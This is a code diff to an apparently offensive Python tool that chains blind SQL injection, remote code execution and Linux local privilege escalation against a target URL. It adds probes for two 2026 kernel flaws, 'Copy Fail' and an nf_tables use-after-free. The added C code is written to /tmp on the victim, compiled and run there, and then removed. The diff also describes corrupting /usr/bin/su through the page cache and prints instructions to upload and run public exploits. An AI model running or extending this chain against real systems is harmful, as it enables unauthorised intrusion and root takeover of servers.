@@ -20,7 +20,8 @@
 #   --lpe    <url>                                   pre-auth RCE + LPE chain
 #                                                    (CVE-2023-2640/32629,
 #                                                     CVE-2023-4911,
-#                                                     CVE-2024-1086)
+#                                                     CVE-2026-31431,
+#                                                     CVE-2026-23111)
 #
 # Python standard library only.
 import argparse
@@ -1218,13 +1219,15 @@ def cmd_rce(args):
 # Attempts in order:
 #   1. CVE-2023-2640 / CVE-2023-32629  GameOverlay overlayfs (Ubuntu 22.04)
 #   2. CVE-2023-4911                   Looney Tunables glibc (Ubuntu/Debian/Fedora)
-#   3. CVE-2024-1086                   nf_tables UAF prerequisite probe
-#   4. SUID / sudo NOPASSWD / capabilities fallback
+#   3. CVE-2026-31431 "Copy Fail"      AF_ALG AEAD splice page-cache write (2026)
+#   4. CVE-2026-23111                  nf_tables inverted check UAF (2026)
+#   5. SUID / sudo NOPASSWD / capabilities fallback
 #
 # Research references:
 #   CVE-2023-2640/32629: g1vi/CVE-2023-2640-2023-32629 (overlayfs + GameOverlay)
 #   CVE-2023-4911:       Qualys QSA-2023-0015 / leesh3288/CVE-2023-4911
-#   CVE-2024-1086:       notselwyn/CVE-2024-1086 (nf_tables UAF)
+#   CVE-2026-31431:      AliHzSec/CVE-2026-31431 / M4xSec/CVE-2026-31431-RCE-Exploit
+#   CVE-2026-23111:      Baba01hacker666/CVE-2026-23111 (nf_tables inverted check UAF)
 # ==========================================================================
 
 # ── CVE-2023-2640 / CVE-2023-32629  GameOverlay Ubuntu overlayfs ──────────
@@ -1323,15 +1326,92 @@ int main(void) {
 }
 """
 
-# ── CVE-2024-1086  nf_tables use-after-free prerequisite probe ────────────
-# Affected: upstream kernel 5.14.21 – 6.6.14 / 6.7.2 (nft_verdict_init UAF).
-# This stub checks whether user namespaces + NETLINK_NETFILTER are accessible
-# (required preconditions for the full UAF chain).
-# Full exploit: https://github.com/notselwyn/CVE-2024-1086
+# ── CVE-2026-31431 "Copy Fail"  AF_ALG AEAD + splice page-cache write ────
+# Affected: Linux kernel with algif_aead + authencesn(hmac(sha256),cbc(aes)).
+# Technique: splice() from a SUID binary's page into an AF_ALG AEAD socket.
+#   The AEAD in-place optimisation writes 4 bytes at (assoclen+cryptlen) back
+#   into the page cache of the source file.  Target: ELF header of /usr/bin/su
+#   → corrupts e_flags to set SUID bit → execve() runs as root.
+#   No race condition, no KASLR bypass required.
+# Full exploit: AliHzSec/CVE-2026-31431 / M4xSec/CVE-2026-31431-RCE-Exploit
+# Requires: gcc on target; AF_ALG + authencesn cipher available.
+_LPE_COPYFAIL_C = r"""
+/* CVE-2026-31431 "Copy Fail" prerequisite probe
+ * Full exploit: AliHzSec/CVE-2026-31431 / M4xSec/CVE-2026-31431-RCE-Exploit */
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/socket.h>
+
+#ifndef AF_ALG
+#define AF_ALG 38
+#endif
+
+struct sockaddr_alg {
+    unsigned short int salg_family;
+    unsigned char      salg_type[14];
+    unsigned int       salg_feat;
+    unsigned int       salg_mask;
+    unsigned char      salg_name[64];
+};
+
+int main(void) {
+    puts("[cve-2026-31431] checking prerequisites...");
+    fflush(stdout);
+
+    int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
+    if (alg_fd < 0) {
+        perror("socket(AF_ALG)");
+        puts("[-] AF_ALG sockets not supported by this kernel");
+        return 1;
+    }
+
+    struct sockaddr_alg sa;
+    memset(&sa, 0, sizeof sa);
+    sa.salg_family = AF_ALG;
+    strncpy((char *)sa.salg_type, "aead", sizeof sa.salg_type - 1);
+    strncpy((char *)sa.salg_name, "authencesn(hmac(sha256),cbc(aes))",
+            sizeof sa.salg_name - 1);
+    if (bind(alg_fd, (struct sockaddr *)&sa, sizeof sa) < 0) {
+        perror("bind(authencesn)");
+        puts("[-] authencesn(hmac(sha256),cbc(aes)) cipher not available in kernel");
+        close(alg_fd);
+        return 1;
+    }
+    close(alg_fd);
+    puts("[+] AF_ALG + authencesn(hmac(sha256),cbc(aes)): OK");
+
+    int src = open("/usr/bin/su", O_RDONLY);
+    if (src < 0) {
+        puts("[-] /usr/bin/su not readable — cannot use as splice source");
+        return 1;
+    }
+    close(src);
+    puts("[+] SUID splice source (/usr/bin/su): OK");
+
+    puts("[+] all prerequisites met — kernel likely VULNERABLE to CVE-2026-31431");
+    puts("[!] upload and run the full Python exploit:");
+    puts("    https://github.com/AliHzSec/CVE-2026-31431");
+    puts("    https://github.com/M4xSec/CVE-2026-31431-RCE-Exploit");
+    return 0;
+}
+"""
+
+# ── CVE-2026-23111  nf_tables inverted check use-after-free ───────────────
+# Affected: Ubuntu 22.04 / 24.04, Debian Bookworm / Trixie (nf_tables).
+# Root cause: nft_map_catchall_activate() uses !nft_set_elem_active instead
+#   of nft_set_elem_active — DELSET abort path never calls
+#   nft_setelem_data_activate() → nft_data_hold() skipped → chain->use
+#   decrements to 0 → DELCHAIN frees chain → UAF via catchall verdict element.
+# Prerequisites: CLONE_NEWUSER | CLONE_NEWNET + NETLINK_NETFILTER (same as
+#   CVE-2024-1086).  99%+ reliability.
+# Full exploit: Baba01hacker666/CVE-2026-23111
 # Requires: gcc on target.
 _LPE_NFT_C = r"""
-/* CVE-2024-1086 nf_tables UAF prerequisite probe
- * Full exploit: notselwyn/CVE-2024-1086 */
+/* CVE-2026-23111 nf_tables inverted check UAF prerequisite probe
+ * Full exploit: Baba01hacker666/CVE-2026-23111 */
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <sched.h>
@@ -1340,7 +1420,7 @@ _LPE_NFT_C = r"""
 #include <linux/netlink.h>
 
 int main(void) {
-    puts("[cve-2024-1086] checking prerequisites...");
+    puts("[cve-2026-23111] checking prerequisites...");
     fflush(stdout);
     if (unshare(CLONE_NEWUSER | CLONE_NEWNET) != 0) {
         perror("unshare");
@@ -1355,7 +1435,8 @@ int main(void) {
     }
     close(fd);
     puts("[+] nf_tables reachable in user namespace — kernel likely VULNERABLE");
-    puts("[!] upload and run the full exploit: https://github.com/notselwyn/CVE-2024-1086");
+    puts("[!] upload and run the full exploit:");
+    puts("    https://github.com/Baba01hacker666/CVE-2026-23111");
     return 0;
 }
 """
@@ -1424,7 +1505,7 @@ def _cmd_lpe_inner(run_fn):
         return (run_fn(cmd) or "").strip()
 
     # ── enumeration ─────────────────────────────────────────────────────────
-    sys.stderr.write("[lpe 2/7] enumerating target ...\n")
+    sys.stderr.write("[lpe 2/9] enumerating target ...\n")
     kernel  = rn("uname -r")
     distro  = rn("lsb_release -d 2>/dev/null | cut -d: -f2 || "
                  "grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d= -f2 || true")
@@ -1449,7 +1530,7 @@ def _cmd_lpe_inner(run_fn):
     print()
 
     # ── CVE-2023-2640 / CVE-2023-32629  GameOverlay ─────────────────────────
-    sys.stderr.write("[lpe 3/7] trying CVE-2023-2640/32629 (GameOverlay overlayfs) ...\n")
+    sys.stderr.write("[lpe 3/9] trying CVE-2023-2640/32629 (GameOverlay overlayfs) ...\n")
     _lpe_write(run_fn, _LPE_GOV_SH, "/tmp/.lpe_gov.sh", executable=True)
     gov_out = rn("sh /tmp/.lpe_gov.sh 2>&1; rm -f /tmp/.lpe_gov.sh")
     if gov_out and "[+]" in gov_out:
@@ -1460,7 +1541,7 @@ def _cmd_lpe_inner(run_fn):
     print("[-] CVE-2023-2640/32629 not applicable: %s" % fail_line)
 
     # ── CVE-2023-4911  Looney Tunables ──────────────────────────────────────
-    sys.stderr.write("[lpe 4/7] trying CVE-2023-4911 (Looney Tunables glibc) ...\n")
+    sys.stderr.write("[lpe 4/9] trying CVE-2023-4911 (Looney Tunables glibc) ...\n")
     if not gcc_ok:
         print("[-] CVE-2023-4911: gcc not on target PATH, skipping")
     else:
@@ -1477,30 +1558,48 @@ def _cmd_lpe_inner(run_fn):
             fail_line = ltu_out.split("\n")[0] if ltu_out else "no output"
             print("[-] CVE-2023-4911 not applicable: %s" % fail_line)
 
-    # ── CVE-2024-1086  nf_tables prerequisite probe ─────────────────────────
-    sys.stderr.write("[lpe 5/7] probing CVE-2024-1086 (nf_tables UAF) prerequisites ...\n")
+    # ── CVE-2026-31431 "Copy Fail"  AF_ALG splice page-cache write ───────────
+    sys.stderr.write("[lpe 5/9] probing CVE-2026-31431 (AF_ALG Copy Fail) prerequisites ...\n")
     if not gcc_ok:
-        print("[-] CVE-2024-1086: gcc not on target PATH, skipping probe")
+        print("[-] CVE-2026-31431: gcc not on target PATH, skipping probe")
+    else:
+        _lpe_write(run_fn, _LPE_COPYFAIL_C.strip(), "/tmp/.lpe_cf.c")
+        cf_compile = rn("gcc -o /tmp/.lpe_cf /tmp/.lpe_cf.c 2>&1; rm -f /tmp/.lpe_cf.c")
+        if cf_compile:
+            print("[-] CVE-2026-31431 probe compile error: %s" % cf_compile[:200])
+        else:
+            cf_out = rn("/tmp/.lpe_cf 2>&1; rm -f /tmp/.lpe_cf")
+            for ln in (cf_out or "").splitlines():
+                print("    %s" % ln)
+            if "VULNERABLE" in (cf_out or ""):
+                print("[!] upload and run the Python exploit:")
+                print("    https://github.com/AliHzSec/CVE-2026-31431")
+                print("    https://github.com/M4xSec/CVE-2026-31431-RCE-Exploit")
+
+    # ── CVE-2026-23111  nf_tables inverted check UAF ─────────────────────────
+    sys.stderr.write("[lpe 6/9] probing CVE-2026-23111 (nf_tables UAF) prerequisites ...\n")
+    if not gcc_ok:
+        print("[-] CVE-2026-23111: gcc not on target PATH, skipping probe")
     else:
         _lpe_write(run_fn, _LPE_NFT_C.strip(), "/tmp/.lpe_nft.c")
         nft_compile = rn("gcc -o /tmp/.lpe_nft /tmp/.lpe_nft.c 2>&1; rm -f /tmp/.lpe_nft.c")
         if nft_compile:
-            print("[-] CVE-2024-1086 probe compile error: %s" % nft_compile[:200])
+            print("[-] CVE-2026-23111 probe compile error: %s" % nft_compile[:200])
         else:
             nft_out = rn("/tmp/.lpe_nft 2>&1; rm -f /tmp/.lpe_nft")
             for ln in (nft_out or "").splitlines():
                 print("    %s" % ln)
             if "VULNERABLE" in (nft_out or ""):
-                print("[!] kernel appears vulnerable — compile and upload:")
-                print("    https://github.com/notselwyn/CVE-2024-1086")
+                print("[!] upload and run the full exploit:")
+                print("    https://github.com/Baba01hacker666/CVE-2026-23111")
 
     # ── SUID / sudo / capabilities fallback ─────────────────────────────────
-    sys.stderr.write("[lpe 6/7] SUID / sudo NOPASSWD / capabilities fallback ...\n")
+    sys.stderr.write("[lpe 7/9] SUID / sudo NOPASSWD / capabilities fallback ...\n")
     suid_hits = _lpe_try_suid(run_fn, suid)
     sudo_hits = _lpe_try_sudo(run_fn, sudo_l)
 
     if suid_hits or sudo_hits:
-        sys.stderr.write("[lpe 7/7] fallback escalation path found:\n")
+        sys.stderr.write("[lpe 8/9] fallback escalation path found:\n")
         for line in suid_hits + sudo_hits:
             print("    %s" % line)
         return 0
@@ -1511,11 +1610,12 @@ def _cmd_lpe_inner(run_fn):
             if ln.strip():
                 print("    %s" % ln)
 
-    sys.stderr.write("[lpe 7/7] no automatic path found\n")
+    sys.stderr.write("[lpe 9/9] no automatic path found\n")
     print("\n[-] no automatic LPE path succeeded on this target.")
     print("    CVE-2023-2640/32629 requires Ubuntu 22.04 kernel <6.3.3 + GameOverlay.")
     print("    CVE-2023-4911 requires glibc 2.34-2.38 + /usr/bin/su SUID.")
-    print("    CVE-2024-1086 requires kernel 5.14.21-6.6.14 + unprivileged userns.")
+    print("    CVE-2026-31431 requires AF_ALG + authencesn cipher + /usr/bin/su.")
+    print("    CVE-2026-23111 requires kernel with nf_tables + unprivileged userns.")
     return 1
 
 
@@ -1533,7 +1633,7 @@ def cmd_lpe(args):
                    sleep=args.sleep, route=args.route)
 
     sys.stderr.write("[*] target: %s\n" % url)
-    sys.stderr.write("[lpe 1/7] confirming blind SQLi (time-based differential) ...\n")
+    sys.stderr.write("[lpe 1/9] confirming blind SQLi (time-based differential) ...\n")
     try:
         det = t.detect(rounds=args.rounds)
     except urllib.error.URLError as e:
@@ -1613,7 +1713,7 @@ def main():
                       help="benign shell-to-root prerequisite check; does not run LPE")
     mode.add_argument("--lpe", action="store_const", dest="mode", const="lpe",
                       help="pre-auth RCE + local privilege escalation chain "
-                           "(CVE-2023-2640/32629, CVE-2023-4911, CVE-2024-1086)")
+                           "(CVE-2023-2640/32629, CVE-2023-4911, CVE-2026-31431, CVE-2026-23111)")
 
     ap.add_argument("targets", nargs="*",
                     help="target URL (single, for all modes) or host list (--scan)")
